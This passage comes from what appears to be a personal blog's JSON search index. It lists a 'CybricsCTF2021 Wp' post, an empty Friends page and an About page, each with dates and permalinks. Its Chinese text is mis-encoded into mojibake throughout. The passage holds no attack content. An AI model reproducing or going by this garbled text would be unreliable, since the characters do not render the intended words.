å‚ç…§ä¸€äº›æ•™ç¨‹æŠŠç®€å•çš„åšå®¢ä¹Ÿæ­èµ·æ¥äº†ï¼Œä»¥åè¦æŠŠè¿™ä¸ªå°çªæ…¢æ…¢ä¸°å¯Œèµ·æ¥(ã‚âˆ€ï½¥)â˜†\n","date":"2021-07-29T17:02:12+08:00","permalink":"https://amiaaaz.github.io/2021/07/29/cybricsctf2021-wp/","section":"posts","tags":["wp","participate"],"title":"CybricsCTF2021 Wp"},{"categories":[],"contents":"å¥½åƒè¿˜æ˜¯ç©ºç©ºå¦‚ä¹Ÿqwq\n","date":"2021-07-27T14:37:22+08:00","permalink":"https://amiaaaz.github.io/friends/","section":"","tags":[],"title":"Friends"},{"categories":[],"contents":"ä½ å¥½å‘€ï¼è¿™é‡Œæ˜¯è‘µå­ è¿™é‡Œåº”è¯¥æœ‰ä¸€ä¸ªç®€ç•¥çš„ä¸ªäººä»‹ç»\nï¼ˆè¯¦ç»†çš„å†…å®¹è¿˜å¾—ç­‰æˆ‘æ…¢æ…¢æªè¾ å‰©ä¸‹éƒ¨åˆ†ç•™ç©ºäº†\n","date":"2021-07-27T14:28:14+08:00","permalink":"https://amiaaaz.github.io/about/","section":"","tags":[],"title":"About"}]